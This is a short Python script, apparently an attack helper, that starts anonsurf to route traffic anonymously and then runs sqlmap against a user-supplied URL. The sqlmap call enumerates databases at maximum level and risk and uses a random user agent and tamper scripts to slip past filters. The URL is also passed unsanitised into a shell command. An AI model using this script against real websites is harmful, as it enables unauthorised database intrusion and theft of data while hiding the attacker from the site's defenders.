import os

os.system("sudo anonsurf start")

input1 =  input("Enter url :")

os.system("sqlmap --url  " + input1 + "  --dbs --random-agent  --tamper=apostrophemask,space2comment --level=5 --risk=3 ")